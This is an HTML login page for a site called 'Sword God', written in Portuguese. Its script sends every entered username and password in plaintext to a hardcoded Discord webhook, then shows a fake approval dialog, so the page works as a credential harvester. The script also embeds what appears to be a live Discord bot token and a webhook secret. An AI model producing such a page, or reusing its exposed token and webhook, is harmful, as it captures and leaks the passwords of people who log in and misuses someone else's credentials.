<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sword God - Login</title>
    <style>
        body {
            background-color: #000; /* Fundo preto */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: 'Arial', sans-serif;
            background-image: url('https://images.pexels.com/photos/1625527/pexels-photo-1625527.jpeg'); /* Imagem de fundo */
            background-size: cover; /* Cobre toda a tela */
            background-position: center; /* Centraliza a imagem */
        }

        .login-container {
            background-color: rgba(50, 50, 50, 0.8); /* Fundo escuro com transparência */
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
            text-align: center;
            width: 300px; /* Largura do formulário */
        }

        h1 {
            color: #8A2BE2; /* Roxo */
            margin-bottom: 20px;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            background-color: #222; /* Fundo dos campos */
            color: #fff; /* Cor do texto */
            font-size: 16px;
        }

        input[type="checkbox"] {
            margin-right: 5px;
        }

        button {
            background-color: #8A2BE2; /* Roxo */
            color: #fff; /* Cor do texto do botão */
            border: none;
            padding: 10px;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
            transition: background-color 0.3s;
        }

        button:hover {
            background-color: #7a1e9e; /* Roxo mais escuro ao passar o mouse */
        }

        .register-link {
            margin-top: 15px;
            color: #8A2BE2; /* Roxo */
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Sword God</h1>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Username" required>
            <input type="password" id="password" placeholder="Password" required>
            <label>
                <input type="checkbox"> Lembrar de mim
            </label>
            <p><a href="#" class="register-link">Esqueceu a senha?</a></p>
            <button type="submit">Login</button>
        </form>
        <p>Não tem uma conta? <a href="#" class="register-link">Registrar</a></p>
    </div>

    <script>
        // Token do bot do Discord
        const discordBotToken = 'MTI5NDY4NTkxMTA0NDU5MTY2Nw.Gl42o-.Oc9cI3-iWY4vu7_5QkYd2vDo6Mi6bi3rejzUXs';

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault(); // Impede o envio padrão do formulário

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Envia os dados do usuário para o bot do Discord
            sendUserToDiscord(username, password);
        });

        function sendUserToDiscord(username, password) {
            const webhookURL = 'https://discord.com/api/webhooks/1294702699161452654/sV4vV0mtEZyB5dXl9xP2ktm2P7hWbsiGAqwgSV3Avscq0e-hcje6ek_Q9UEkd3oGgu38';

            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    content: `Novo usuário registrado!\nNome: ${username}\nSenha: ${password}\nDeseja aceitar o login?`
                })
            })
            .then(response => {
                if (response.ok) {
                    // Simula a resposta do bot com reações
                    askForAcceptance(username);
                } else {
                    alert('Erro ao registrar o usuário.');
                }
            });
        }

        function askForAcceptance(username) {
            const userResponse = confirm(`Novo usuário registrado!\nNome: ${username}\nDeseja aceitar o login?`);

            if (userResponse) {
                alert('Seu login foi aceito!');
            } else {
                window.location.href = '404.html'; // Redireciona para uma página 404
            }
        }
    </script>
</body>
</html>
